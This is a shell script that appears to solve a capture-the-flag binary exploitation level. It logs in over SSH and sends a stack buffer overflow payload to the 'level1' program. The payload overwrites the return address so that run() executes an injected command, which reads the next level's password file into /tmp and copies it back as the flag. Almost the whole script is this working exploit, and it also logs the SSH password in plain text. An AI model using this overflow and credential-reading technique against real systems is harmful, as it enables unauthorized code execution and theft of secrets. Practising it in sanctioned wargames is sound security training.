#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# #### #
# MAIN #
# #### #

main() {
    flag="";

    log "Authenticating to SSH server at $host:$port with username '$username' and password '$password'...";

    # /!\ In dash `printf` doesn't support the `\xHH` format specifier. So we use octal instead of hexadecimal. /!\
    # 1. Local variables filler (buffer + padding) = 72 bytes.
    local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
    # 2. EBP filler = 4 bytes.
    ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
    # 3. `main()`s return address = run() = 4 bytes.
    main_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
    # 4. `run()`s return address = exit() = 4 bytes.
    run_retaddr="$(printf "%s" "\340\353\345\267")"; # `run()`s Return address, set to `exit()` = 4 bytes.
    # 5. Setup the payload.
    payload="${local_vars_filler}${ebp_filler}${main_retaddr}${run_retaddr}";

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket." >&2; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
    (
        printf '%s' 'cat "/home/user/level2/.pass" > /tmp/flag.txt;';
    ) | ssh_exec_via_socket "$host" "$port" "$username" "(printf '%b' '$payload\n'; cat -) | ~/level1 >&2";
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket." >&2; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    log "Flag '$flag' has been written to '$flag_path'";
    echo -n "$flag" > "$flag_path";
}

main "$@";
